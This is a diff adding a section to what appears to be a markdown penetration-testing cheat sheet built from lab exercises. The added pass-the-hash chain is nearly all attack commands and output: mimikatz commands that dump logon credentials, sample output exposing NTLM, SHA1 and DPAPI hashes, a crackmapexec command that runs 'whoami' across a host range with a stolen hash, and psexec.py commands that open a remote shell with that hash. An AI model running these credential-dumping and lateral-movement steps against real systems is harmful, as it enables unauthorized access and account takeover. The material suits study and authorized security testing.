@@ -1694,6 +1694,49 @@ crackmapexec smb 10.11.1.120-124 -u administrator -H 'LMHASH:NTHASH' --local-aut
 The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.
 ````
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Administrator@192.168.129.59
+psexec.py tris@10.11.1.20 -hashes 08df3c73ded940e1f2bcf5eea4b8dbf6:08df3c73ded940e1f2bcf5eea4b8dbf6
+````
+##### Exploitation chain
+###### mimikatz.exe
+````
+privilege::debug
+sekurlsa::logonpasswords
+````
+````
+Authentication Id : 0 ; 206403 (00000000:00032643)
+Session           : Interactive from 1
+User Name         : tris
+Domain            : svcorp
+Logon Server      : SV-DC01
+Logon Time        : 3/24/2022 3:59:41 PM
+SID               : S-1-5-21-466546139-763938477-1796994327-1124
+        msv :
+         [00000003] Primary
+         * Username : tris
+         * Domain   : svcorp
+         * NTLM     : 08df3c73ded940e1f2bcf5eea4b8dbf6
+         * SHA1     : b6e8eb6ec416d510bd082d72d687b2f41d6b5dc3
+         * DPAPI    : 2800a2930c81ce49f9cc565282754433
+        tspkg :
+        wdigest :
+         * Username : tris
+         * Domain   : svcorp
+         * Password : (null)
+        kerberos :
+         * Username : tris
+         * Domain   : SVCORP.COM
+         * Password : (null)
+        ssp :
+        credman :
+
+````
+###### cme
+`````
+crackmapexec smb 10.11.1.20-24 -u tris -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d svcorp.com -x whoami
+`````
+###### foothold
+````
+psexec.py tris@10.11.1.20 -hashes 08df3c73ded940e1f2bcf5eea4b8dbf6:08df3c73ded940e1f2bcf5eea4b8dbf6
 ````
 #### Overpass the Hash <img src="https://cdn-icons-png.flaticon.com/128/9513/9513588.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/5584/5584500.png" width="40" height="40" /> 
 With overpass the hash,1 we can "over" abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.
